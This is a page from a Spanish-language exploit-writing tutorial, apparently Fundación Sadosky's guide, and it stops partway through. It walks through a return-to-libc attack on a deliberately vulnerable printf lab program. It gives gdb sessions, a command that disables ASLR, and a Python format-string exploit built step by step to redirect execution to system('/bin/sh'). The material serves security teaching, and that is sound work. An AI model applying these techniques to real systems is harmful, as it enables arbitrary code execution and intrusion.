<!DOCTYPE html>
<html lang="en-us">

  <head>
  <link href="http://gmpg.org/xfn/11" rel="profile">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta http-equiv="content-type" content="text/html; charset=utf-8">

  <!-- Enable responsiveness on mobile devices-->
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">

  <title>
    
       &middot; Guía de exploits
    
  </title>

  <!-- CSS -->

  <link rel="stylesheet" href="/public/css/poole.css">
  <link rel="stylesheet" href="/public/css/syntax.css">
  <link rel="stylesheet" href="/public/css/hyde.css">
  <link rel="stylesheet" href="http://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700|Abril+Fatface">

  <!-- Icons -->
  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/guia-escritura-exploits/public/apple-touch-icon-144-precomposed.png">
                                 <link rel="shortcut icon" href="/guia-escritura-exploits/public/favicon.ico">

  <!-- RSS -->
  <link rel="alternate" type="application/rss+xml" title="RSS" href="/atom.xml">
</head>


  <body>

    <div class="sidebar">
 <!-- <div class="container sidebar-sticky">-->
  <div class="container sidebar">
    <div class="sidebar-about">
      <h1>
        <a href="/guia-escritura-exploits/">
          Guía de exploits
        </a>
      </h1>
      <!--<p class="lead"></p>-->
    </div>

    <nav class="sidebar-nav">

     <!-- <a class="sidebar-nav-item" href="/guia-escritura-exploits/">Home</a>-->

        <a class="sidebar-nav-item" href="/guia-escritura-exploits/buffer-overflow/index.html">Buffer Overflow</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/1-introduccion.html">Nivel 1 | Teoría</a>        
        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/1-practica.html">Nivel 1 | Práctica</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/2-shellcode.html">Nivel 2 | Shellcode</a>        
        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/2-practica.html">Nivel 2 | Práctica</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/3-got.html">Nivel 3 | GOT</a>        
        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/3-practica.html">Nivel 3 | Práctica</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/4-practica.html">Nivel 4 | Práctica</a>

        <a class="sidebar-nav-item" href="/guia-escritura-exploits/format-string/index.html">Format String</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/format-string/5-format-string.html">Nivel 5 | Format strings</a>        
        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/format-string/5-practica.html">Nivel 5 | Práctica</a>

        <a class="sidebar-nav-item" href="/guia-escritura-exploits/esoteric/index.html">Esoteric</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/esoteric/6-ret2libc.html">Nivel 6 | Return to libc</a>        
        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/esoteric/6-practica.html">Nivel 6 | Práctica</a>

        <a class="sidebar-nav-item" href="/guia-escritura-exploits/configuracion.html">Configuración</a>
        <a class="sidebar-nav-item" href="/guia-escritura-exploits/herramientas.html">Herramientas</a>


      <!--<a class="sidebar-nav-item" href="/archive/v2.1.0.zip">Descargar PDF</a>-->
      <a class="sidebar-nav-item" href="https://github.com/fundacion-sadosky/guia-escritura-exploits">Proyecto en GitHub</a>
    </nav>

    <p class="sidebar-nav-item footer">Basado en los <a href="https://github.com/gerasdf/InsecureProgramming/">abos de Gera</a></br> Teresa Alberto | STIC, Fundación Sadosky  </br> <a href="https://github.com/fundacion-sadosky/guia-escritura-exploits/blob/master/LICENSE">BY-NC-SA</a> | 2018</p>
  </div>
</div>


    <div class="content container">
      <div class="page">
  <!--<h1 class="page-title"></h1>-->
  <h1 id="ataque-return-to-libc">Ataque return to libc</h1>

<p>La creación de exploits en un escenario en el que no se admite ejecución de código en la pila.</p>

<h2 id="anlisis-del-programa-vulnerable">Análisis del programa vulnerable</h2>
<h3 id="e-1">E 1</h3>
<div class="language-c highlighter-rouge"><pre class="codehilite"><code><span class="cm">/* e1.c                                         *
* specially crafted to feed your brain by gera */</span>
<span class="cm">/* jumpy vfprintf, Batman! */</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argv</span><span class="p">,</span><span class="kt">char</span> <span class="o">**</span><span class="n">argc</span><span class="p">)</span> <span class="p">{</span>
        <span class="cm">/* Can you do it changing the stack?  */</span>
        <span class="cm">/* Can you do it without changing it? */</span>
        <span class="n">printf</span><span class="p">(</span><span class="n">argc</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
        <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>

<h3 id="qu-hace-el-programa">¿Qué hace el programa?</h3>
<p>El programa imprime el input del usuario y se mantiene en un loop infinito sin finalizar.</p>

<h3 id="cul-es-la-dificultad-principal">¿Cuál es la dificultad principal?</h3>
<ul>
  <li>Existe un <code class="highlighter-rouge">while(1)</code> que provoca un bucle infinito que vuelve inútil sobreescribir la dirección de retorno del <code class="highlighter-rouge">main()</code>.</li>
  <li>En este nivel se propone habilitar la <a href="../configuracion.md#deshabilitar-mitigacion-wx">mitigación W^X</a>, por lo que se asumirá que el programa se compila sin el flag <code class="highlighter-rouge">-z execstack</code> y por ende que no es posible ejecutar nuestro propio shellcode almacenado en la pila. Eso nos obliga a cambiar la estrategia de ataque.</li>
</ul>

<p>Entonces a partir de ahora la compilación del binario se realiza de esta manera:
  <code class="highlighter-rouge">shell_session
  user@abos:~$ gcc -m32 -no-pie -fno-stack-protector -ggdb -mpreferred-stack-boundary=2 -o e1 e1.c
 </code></p>

<h2 id="ataque-return-to-libc-1">Ataque return to libc</h2>
<p>Se observa un uso vulnerable de <code class="highlighter-rouge">printf()</code> bajo la forma: <code class="highlighter-rouge">printf (argv[1])</code>. Es posible ingresar un input que incluya especificadores de formato como por ejemplo <code class="highlighter-rouge">%x%x</code> (para conocer direcciones de la pila) o <code class="highlighter-rouge">%n</code> (para escribir en la pila).</p>

<p>Se puede aprovechar la vulnerabilidad de este programa de varias maneras. En este caso se va a seguir una estrategia de ataque del tipo <strong>return-to-libc</strong>.</p>

<p>El objetivo será sobreescribir la dirección de retorno de <code class="highlighter-rouge">printf()</code> para que en vez de retornar a <code class="highlighter-rouge">main()</code>, se ejecute la función <code class="highlighter-rouge">system()</code> dentro de <code class="highlighter-rouge">libc</code>. Previamente se adecúa la pila para simular un llamado válido a <code class="highlighter-rouge">system()</code> con el argumento <code class="highlighter-rouge">/bin/sh</code>, que nos dará una shell.</p>

<p><img src="imagenes/e1/pila-ret2libc.png" alt="ret2libc" /></p>

<p>El exploit cuenta con tres partes:</p>

<p><strong>Primera parte</strong>: usamos <code class="highlighter-rouge">gdb</code> para conocer tres direcciones en el mapa de memoria del proceso: la dirección de retorno de <code class="highlighter-rouge">printf()</code>, la dirección de <code class="highlighter-rouge">system()</code> en <code class="highlighter-rouge">libc</code> y la dirección del string <code class="highlighter-rouge">/bin/sh</code>.</p>

<p><strong>Segunda parte</strong>: sobreescribimos la dirección de retorno de <code class="highlighter-rouge">printf()</code> en principio con un número arbitrario.</p>

<p><strong>Tercera parte</strong>: escribimos en esa dirección de retorno exactamente la dirección de <code class="highlighter-rouge">system()</code>.</p>

<p><strong>Cuarta parte</strong>: ubicamos el string <code class="highlighter-rouge">/bin/sh</code> en el lugar indicado en la pila para que <code class="highlighter-rouge">system()</code> lo considere como su argumento y lograr el llamado a <code class="highlighter-rouge">system("/bin/sh")</code>.</p>

<p>…………………………………………………………………………………………………………………………………………………</p>

<p><strong>Primera parte</strong>: averiguamos con <code class="highlighter-rouge">gdb</code> las direcciones necesarias.   <br />
Creamos un archivo <code class="highlighter-rouge">exploit.py</code> con un input de prueba, cuidando mantener el mismo padding durante toda la resolución del problema para controlar las direcciones de la pila.
   ```python
   #! /usr/bin/env python</p>

<p>import sys
   from struct import pack</p>

<p>#padding para controlar las direcciones de la pila
   def pad(s):
        return (s + “A”*100000)[:100000]</p>

<p>exploit  = “BBBB”</p>

<p>sys.stdout.write(pad(exploit))
   ```</p>

<ol>
  <li>Averiguamos la dirección de retorno de <code class="highlighter-rouge">printf()</code>:
    <div class="language-shell_session highlighter-rouge"><pre class="codehilite"><code><span class="w">user@abos:~$ </span><span class="nc">gdb</span><span class="kv"> e1
</span>GNU gdb (Debian 7.7.1+dfsg-5) 7.7.1
Copyright (C) 2014 Free Software Foundation, Inc.
Reading symbols from e1...done.
(gdb) r "$(./exploit.py)"
(gdb) si
0x080482d0 in printf@plt ()       ; primera instrucción de printf()
(gdb) x/wx $esp
0xbffe70c0 : 0x0804840c           ; dirección de retorno a main apilada
</code></pre>    </div>

    <p>En <code class="highlighter-rouge">gdb</code> avanzamos instrucción a instrucción con el comando siguiente instrucción (<code class="highlighter-rouge">"si"</code>) hasta entrar en el <code class="highlighter-rouge">call printf</code>. Exactamente en la primera instrucción dentro de <code class="highlighter-rouge">printf</code> consultamos el tope de la pila para conocer qué dirección de retorno se apiló antes de saltar a la función.</p>

    <p><strong>La dirección de retorno de <code class="highlighter-rouge">printf()</code> es <code class="highlighter-rouge">0xbffe70c0</code>.</strong></p>
  </li>
  <li>
    <p>Averiguamos la dirección de <code class="highlighter-rouge">system()</code> en <code class="highlighter-rouge">libc</code>:</p>

    <p>En <code class="highlighter-rouge">gdb</code> imprimimos la dirección de la siguiente manera:</p>
    <div class="language-shell_session highlighter-rouge"><pre class="codehilite"><code><span class="w">user@abos:~$ </span><span class="nc">gdb</span><span class="kv"> e1
</span>GNU gdb (Debian 7.7.1+dfsg-5) 7.7.1
Copyright (C) 2014 Free Software Foundation, Inc.
Reading symbols from e1...done.
(gdb) break main
(gdb) r "$(./exploit.py)"
(gdb) p system                    ; consultamos la dirección de system en libc
$1 = {&lt;text variable, no debug info&gt;} 0xb7e633e0 &lt;__libc_system&gt;
</code></pre>    </div>

    <p><strong>La dirección de <code class="highlighter-rouge">system()</code> en <code class="highlighter-rouge">libc</code> es <code class="highlighter-rouge">0xb7e633e0</code>.</strong></p>

    <p>Recordemos que podemos utilizar esta dirección dado que la misma no cambia en cada ejecución del programa porque hemos deshabilitado la mitigación ASLR con la configuración:
   <code class="highlighter-rouge">shell_session
   user@abos:~$ sudo sysctl -w kernel.randomize_va_space=0
   kernel.randomize_va_space=0
  </code></p>
  </li>
  <li>Averiguamos la dirección del string <code class="highlighter-rouge">/bin/sh</code>:    <br />
Si bien se suele almacenar <code class="highlighter-rouge">"/bin/sh"</code> dentro de una variable de entorno, también es posible encontrar ese string dentro de <code class="highlighter-rouge">libc</code>. Averiguamos su dirección de la siguiente manera:
    <div class="language-shell_session highlighter-rouge"><pre class="codehilite"><code>       user@abos:~$ gdb e1
          
       (gdb) info proc map                          ; consultamos addr libc
       process 840
       Mapped address spaces:  
         Start Addr   End Addr       Size     Offset objfile
         .... 
+----    0xb7e25000 0xb7fcc000   0x1a7000        0x0 /lib/i386-linux-gnu/i686/cmov/libc-2.19.so 
|    
|        
+---&gt;  (gdb) find 0xb7e25000, +9999999, "/bin/sh"   ; buscamos desde 0xb7e25000 la dirección de libc 
       0xb7f84551                                   ; encontró una coincidencia
       warning: Unable to access 16000 bytes of target memory at 0xb7fce8d9, halting search.
       1 pattern found.

       (gdb) x/s 0xb7f84551                         ; verificamos dirección del string /bin/sh
       0xb7f84551:	"/bin/sh"
</code></pre>    </div>

    <p><strong>La dirección de <code class="highlighter-rouge">/bin/sh</code> es entonces <code class="highlighter-rouge">0xb7f84551</code>.</strong></p>
  </li>
</ol>

<p><strong>Segunda parte</strong>: queremos sobreescribir la dirección de retorno de <code class="highlighter-rouge">printf()</code>, en principio con un número arbitrario. Aprovechamos la vulnerabilidad del format string para sobreescribir ese valor en la pila.</p>

<ol>
  <li>
    <p>Identificamos el parámetro  <code class="highlighter-rouge">%08x</code> que imprime el format string.  <br />
Construimos un string como input para <code class="highlighter-rouge">printf()</code> que imprima el contenido de la pila concatenando varios <code class="highlighter-rouge">%08x</code>, y que comience con un patron identificable (<code class="highlighter-rouge">0x42424242...</code>).</p>

    <p>El objetivo de este paso intermedio es saber cuál de los parametros <code class="highlighter-rouge">%08x</code> imprime el comienzo de nuestro string <code class="highlighter-rouge">0x42424242</code>. Una vez detectado ese parámetro lo reemplazamos por <code class="highlighter-rouge">%n</code>, parámetro que no imprime sino que <strong>escribe</strong> la cantidad de bytes procesados <strong>en</strong> la dirección dada por el comienzo del string (inicialmente <code class="highlighter-rouge">0x42424242</code>).</p>

    <p><img src="imagenes/e1/parametro.png" alt="gdb" /></p>

    <p>Para ello adecuamos el script:</p>
    <div class="language-python highlighter-rouge"><pre class="codehilite"><code> <span class="c">#! /usr/bin/env python</span>
 <span class="s">"""Uso: ./e1 "$(./exploit.py)" """</span>    

 <span class="kn">import</span> <span class="nn">sys</span>
 <span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>

 <span class="c">#padding para controlar las direcciones de la pila</span>
 <span class="k">def</span> <span class="nf">pad</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
      <span class="k">return</span> <span class="p">(</span><span class="n">s</span> <span class="o">+</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">100000</span><span class="p">)[:</span><span class="mi">100000</span><span class="p">]</span>

 <span class="n">exploit</span>  <span class="o">=</span> <span class="s">"BBBBBBBBBBBBBBBBBBBBBBBBBBB"</span>
 <span class="n">exploit</span> <span class="o">+=</span> <span class="s">"BBBBBBBBBBBBBBBBBBBBBBBBBBB"</span>
 <span class="n">exploit</span> <span class="o">+=</span> <span class="s">"BBBBBBBBBBBBBBBBBBBBBBBBBBB"</span>
 <span class="n">exploit</span> <span class="o">+=</span> <span class="s">"</span><span class="si">%08</span><span class="s">x.</span><span class="si">%08</span><span class="s">x.</span><span class="si">%08</span><span class="s">x.</span><span class="si">%08</span><span class="s">x."</span> <span class="o">*</span> <span class="mi">200</span>    <span class="p">;</span> <span class="n">imprimimos</span> <span class="n">contenido</span> <span class="n">de</span> <span class="n">la</span> <span class="n">pila</span>

 <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">pad</span><span class="p">(</span><span class="n">exploit</span><span class="p">))</span>
</code></pre>    </div>

    <p>En <code class="highlighter-rouge">gdb</code> vemos la impresión de valores de la pila por los sucesivos <code class="highlighter-rouge">%08x.%08x.%08x.%08x...</code> hasta identificar el comienzo del string.</p>

    <p><img src="imagenes/e1/img2.png" alt="gdb" /></p>

    <p>Identificamos cual de los parámetros imprime el comienzo del string. Para eso vamos quitando <code class="highlighter-rouge">%08x</code> hasta imprimir sólo el comienzo del string y observar que inmediatamente lo siguen las <code class="highlighter-rouge">"AAAA..."</code> del padding.  <br />
   En este caso con prueba y error detectamos que el parámetro número 116 imprime el <code class="highlighter-rouge">0x42424242</code> inicial. En la imagen a continuación se ve cómo lo siguen las “AAAA…” del padding que incluimos.</p>

    <p>```python
   #! /usr/bin/env python
   “"”Uso: ./e1 “$(./exploit.py)” “””</p>

    <p>import sys
   from struct import pack</p>

    <p>#padding para controlar las direcciones de la pila
   def pad(s):
        return (s + “A”*100000)[:100000]</p>

    <p>exploit  = “B”           # alineacion
   exploit += “BBBB”        # comienzo del string
   exploit += “%08x.” * 116</p>

    <p>sys.stdout.write(pad(exploit))
   ```</p>

    <p><img src="imagenes/e1/img3.png" alt="gdb" /></p>
  </li>
  <li>
    <p>Reemplazamos el principio del string <code class="highlighter-rouge">0x42424242</code> por la dirección de retorno de <code class="highlighter-rouge">printf</code> alineada adecuadamente. 
<img src="imagenes/e1/parametro2.png" alt="gdb" /></p>

    <p>El archivo <code class="highlighter-rouge">exploit.py</code> resultante es:</p>
    <div class="language-python highlighter-rouge"><pre class="codehilite"><code><span class="c">#! /usr/bin/env python</span>
<span class="s">"""Uso: ./e1 "$(./exploit.py)" """</span>
   
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
   
<span class="k">def</span> <span class="nf">pad</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
     <span class="k">return</span> <span class="p">(</span><span class="n">s</span> <span class="o">+</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">100000</span><span class="p">)[:</span><span class="mi">100000</span><span class="p">]</span>
   
<span class="n">ret_addr</span>  <span class="o">=</span> <span class="mh">0xbffe70c0</span>
   
<span class="n">exploit</span>  <span class="o">=</span> <span class="s">"B"</span>                      <span class="c"># alineacion</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span> <span class="n">ret_addr</span><span class="p">)</span>     <span class="c"># ret_addr_after_printf </span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="s">"BBBB"</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="s">"</span><span class="si">%08</span><span class="s">x."</span> <span class="o">*</span> <span class="mi">116</span>
   
<span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">pad</span><span class="p">(</span><span class="n">exploit</span><span class="p">))</span>
</code></pre>    </div>

    <p>Y vemos que el parámetro <code class="highlighter-rouge">%08x</code> número 116 imprime esa dirección en el output resultante:</p>

    <p><img src="imagenes/e1/img4.png" alt="gdb" /></p>
  </li>
  <li>
    <p>Si reemplazamos el último <code class="highlighter-rouge">%x</code> por <code class="highlighter-rouge">%n</code> vemos como escribimos <strong>en</strong> la dirección de retorno de <code class="highlighter-rouge">printf</code> el número de caracteres procesados hasta el momento.</p>

    <p><img src="imagenes/e1/parametro3.png" alt="pila" /></p>

    <p>Para ello adecuamos el exploit:</p>

    <div class="language-python highlighter-rouge"><pre class="codehilite"><code><span class="c">#! /usr/bin/env python</span>
<span class="s">"""Uso: ./e1 "$(./exploit.py)" """</span>
   
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
   
<span class="k">def</span> <span class="nf">pad</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
     <span class="k">return</span> <span class="p">(</span><span class="n">s</span> <span class="o">+</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">100000</span><span class="p">)[:</span><span class="mi">100000</span><span class="p">]</span>
   
<span class="n">ret_addr</span>  <span class="o">=</span> <span class="mh">0xbffe70c0</span>
   
<span class="n">exploit</span>  <span class="o">=</span> <span class="s">"B"</span>                      <span class="c"># alineacion</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span> <span class="n">ret_addr</span><span class="p">)</span>     <span class="c"># ret_addr_after_printf </span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="s">"BBBB"</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="s">"</span><span class="si">%08</span><span class="s">x."</span> <span class="o">*</span> <span class="mi">115</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="s">"</span><span class="si">%</span><span class="s">n"</span>                     <span class="c"># escribimos caract. procesados</span>
<span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">pad</span><span class="p">(</span><span class="n">exploit</span><span class="p">))</span>
</code></pre>    </div>

    <p>Al ejecutar, como <code class="highlighter-rouge">%n</code> siempre escribe la cantidad de caracteres procesados en la dirección dada, vemos que escribimos <code class="highlighter-rouge">0x414</code> en la dirección de retorno de <code class="highlighter-rouge">printf</code>.</p>
    <div class="language-shell_session highlighter-rouge"><pre class="codehilite"><code>(gdb) r "$(./exploit.py)"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
Program received signal SIGSEGV, Segmentation fault.
0x00000414 in ?? ()                         ; logramos un salto en la ejecución
Cannot write the dashboard 
Traceback (most recent call last):
  File "&lt;string&gt;", line 358, in render
  File "&lt;string&gt;", line 939, in lines
MemoryError: Cannot access memory at address 0x414
(gdb) x/wx 0xbffe70c0                                                                   
0xbffe70c0: 0x00000414                      ; logramos esta escritura!
</code></pre>    </div>
    <p>Como en la dirección de retorno se almacena el valor <code class="highlighter-rouge">0x00000414</code>, al finalizar el llamado a <code class="highlighter-rouge">printf()</code> se intenta retornar a esa dirección provocando una violación de segmento.    <br />
Logramos cumplir el objetivo intermedio: nos aprovechamos del format string para sobreescribir la dirección de retorno del <code class="highlighter-rouge">printf</code> y controlar el flujo de ejecución del programa. En este punto sobreescribirmos la dirección de retorno con el número <code class="highlighter-rouge">0x414</code> (la cantidad de bytes del string procesados hasta el <code class="highlighter-rouge">%n</code>). Todavía es necesario escribir exactamente la dirección de <code class="highlighter-rouge">system()</code> para que sea esa la función que se ejecute.</p>
  </li>
  <li>
    <p>Usaremos como recurso el padding de los parámetros de formato para controlar la cantidad de caracteres que procesa <code class="highlighter-rouge">%n</code>. En el especificador previo al <code class="highlighter-rouge">%n</code> agregamos un padding <code class="highlighter-rouge">%100x</code> para ver la cantidad de caracteres procesados que se escriben.   <br />
El objetivo será reemplazar la dirección de retorno de <code class="highlighter-rouge">printf()</code> por <code class="highlighter-rouge">system()</code>, es decir, debemos lograr que la cantidad de caracteres procesados coincida con la dirección de <code class="highlighter-rouge">system()</code> tal como se muestra en la imagen a continuación.</p>

    <p><img src="imagenes/e1/parametro4.png" alt="pila" /></p>

    <p>Modificamos el script:</p>

    <div class="language-python highlighter-rouge"><pre class="codehilite"><code><span class="c">#! /usr/bin/env python</span>
<span class="s">"""Uso: ./e1 "$(./exploit.py)" """</span>
   
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
   
<span class="k">def</span> <span class="nf">pad</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
     <span class="k">return</span> <span class="p">(</span><span class="n">s</span> <span class="o">+</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">100000</span><span class="p">)[:</span><span class="mi">100000</span><span class="p">]</span>
   
<span class="n">ret_addr</span>  <span class="o">=</span> <span class="mh">0xbffe70c0</span>
   
<span class="n">exploit</span>  <span class="o">=</span> <span class="s">"B"</span>                      <span class="c"># alineacion</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span> <span class="n">ret_addr</span><span class="p">)</span>     <span class="c"># ret_addr_after_printf </span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="s">"BBBB"</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="s">"</span><span class="si">%08</span><span class="s">x."</span> <span class="o">*</span> <span class="mi">114</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="s">"</span><span class="si">%100</span><span class="s">x"</span>                  <span class="c"># modificamos cant. caract. procesados</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="s">"</span><span class="si">%</span><span class="s">n"</span>                     <span class="c"># escribimos en ret_addr_after_printf</span>
   
<span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">pad</span><span class="p">(</span><span class="n">exploit</span><span class="p">))</span>
</code></pre>    </div>
    <p>Y lo ejecutamos:</p>
    <div class="language-shell_session highlighter-rouge"><pre class="codehilite"><code>(gdb) r "$(./exploit.py)"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Program received signal SIGSEGV, Segmentation fault.
0x0000046f in ?? ()
Cannot write the dashboard
Traceback (most recent call last):
  File "&lt;string&gt;", line 358, in render
  File "&lt;string&gt;", line 939, in lines
MemoryError: Cannot access memory at address 0x46f
(gdb) x/wx 0xbffe70c0                                                                   
0xbffe70c0: 0x0000046f
</code></pre>    </div>

    <p>Ahora en la dirección de retorno se almacena el valor <code class="highlighter-rouge">0x0000046f</code>, al finalizar el llamado a <code class="highlighter-rouge">printf()</code> se intenta retornar a esa dirección provocando también una violación de segmento. Entonces sabemos que la cantidad de caracteres procesados incluido el padding de <code class="highlighter-rouge">"%100x"</code> es <code class="highlighter-rouge">0x46f</code>.</p>
  </li>
</ol>

<p><strong>Tercera parte</strong>: no queremos escribir cualquier número en <code class="highlighter-rouge">ret_addr</code> sino exactamente la dirección de <code class="highlighter-rouge">system()</code>.   <br />
Escribir con <code class="highlighter-rouge">%n</code> la dirección de <code class="highlighter-rouge">system</code> implicaría procesar una cantidad de bytes enormes, para evitarlo escribiremos la dirección de <code class="highlighter-rouge">system</code> de a un byte a la vez con el parámetro <code class="highlighter-rouge">%hhn</code>.</p>

<ol>
  <li>
    <p>Con cuatro parámetros <code class="highlighter-rouge">%hhn</code> sobreescribimos de a un byte a la vez la nueva dirección de retorno.    <br />
Recordemos que la dirección de retorno de <code class="highlighter-rouge">printf</code> se encuentra en <code class="highlighter-rouge">0xbffe70c0</code> y la dirección de <code class="highlighter-rouge">system</code> es <code class="highlighter-rouge">0xb7e633e0</code>. El objetivo será modificar byte por byte esta dirección de retorno de la siguiente manera:</p>

    <div class="language-nasm highlighter-rouge"><pre class="codehilite"><code><span class="n">Valor</span> <span class="n">de</span> <span class="err">`</span><span class="n">ret_addr_after_printf</span><span class="err">`</span>

<span class="err">#</span> <span class="n">byte</span> <span class="o">|</span> <span class="n">ret_addr</span>    <span class="o">|</span> <span class="n">valor</span> <span class="n">actual</span>  <span class="o">|</span> <span class="n">valor</span> <span class="n">deseado</span> <span class="p">(</span><span class="n">system_addr</span><span class="p">)</span> 
   <span class="mi">0</span>     <span class="mh">0xbffe70c0</span><span class="o">:</span>       <span class="mh">0x0c</span>     <span class="o">--&gt;</span>      <span class="mh">0xe0</span>
   <span class="mi">1</span>     <span class="mh">0xbffe70c1</span><span class="o">:</span>       <span class="mh">0x84</span>     <span class="o">--&gt;</span>      <span class="mh">0x33</span>
   <span class="mi">2</span>     <span class="mh">0xbffe70c2</span><span class="o">:</span>       <span class="mh">0x04</span>     <span class="o">--&gt;</span>      <span class="mh">0xe6</span> 
   <span class="mi">3</span>     <span class="mh">0xbffe70c2</span><span class="o">:</span>       <span class="mh">0x08</span>     <span class="o">--&gt;</span>      <span class="mh">0xb7</span>
                      <span class="o">---------------</span>  <span class="o">----------------</span>  
                         <span class="mh">0x0804840c</span>       <span class="mh">0xb7e633e0</span>
</code></pre>    </div>

    <p>Entonces en el exploit desglosamos la dirección de retorno en cada uno de sus bytes. Y por cada byte, vamos a incluir una dupla <code class="highlighter-rouge">"%&lt;padding&gt;x + %hhn"</code> para escribir una parte de la dirección de <code class="highlighter-rouge">system</code> en cada uno de ellos. Por ejemplo, para el primer byte menos significativo de la dirección de retorno incluimos las siguientes líneas en el script:</p>
    <div class="language-python highlighter-rouge"><pre class="codehilite"><code><span class="c">#Dupla para 1er byte de ret_addr</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="s">"</span><span class="si">%100</span><span class="s">x"</span>                       <span class="c">#cant. bytes procesados: ???</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="s">"</span><span class="si">%</span><span class="s">hhn"</span>                        <span class="c">#escribe ret_addr_byte_0</span>
</code></pre>    </div>
    <p>El layout de la pila deseado será algo similar a:</p>

    <p><img src="imagenes/e1/parametro5.png" alt="pila" /></p>

    <p>El exploit queda construido de la siguiente manera:</p>
    <div class="language-python highlighter-rouge"><pre class="codehilite"><code><span class="c">#! /usr/bin/env python</span>
<span class="s">"""Uso: ./e1 "$(./exploit.py)" """</span>
   
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
   
<span class="k">def</span> <span class="nf">pad</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
        <span class="k">return</span> <span class="p">(</span><span class="n">s</span> <span class="o">+</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">100000</span><span class="p">)[:</span><span class="mi">100000</span><span class="p">]</span>
   
<span class="n">ret_addr</span>     <span class="o">=</span> <span class="mh">0xbffe70c0</span>
<span class="c">#system_addr = 0xb7e633e0</span>
   
<span class="n">ret_addr_byte_0</span> <span class="o">=</span> <span class="n">ret_addr</span>              <span class="c"># low byte: 0x0c</span>
<span class="n">ret_addr_byte_1</span> <span class="o">=</span> <span class="n">ret_addr</span> <span class="o">+</span> <span class="mi">1</span>          <span class="c"># 2nd byte: 0x84</span>
<span class="n">ret_addr_byte_2</span> <span class="o">=</span> <span class="n">ret_addr</span> <span class="o">+</span> <span class="mi">2</span>          <span class="c"># 3rd byte: 0x04</span>
<span class="n">ret_addr_byte_3</span> <span class="o">=</span> <span class="n">ret_addr</span> <span class="o">+</span> <span class="mi">3</span>          <span class="c">#high byte: 0x08</span>
   
<span class="n">exploit</span>  <span class="o">=</span> <span class="s">"A"</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span> <span class="n">ret_addr_byte_0</span><span class="p">)</span>  <span class="c">#%hhn</span>
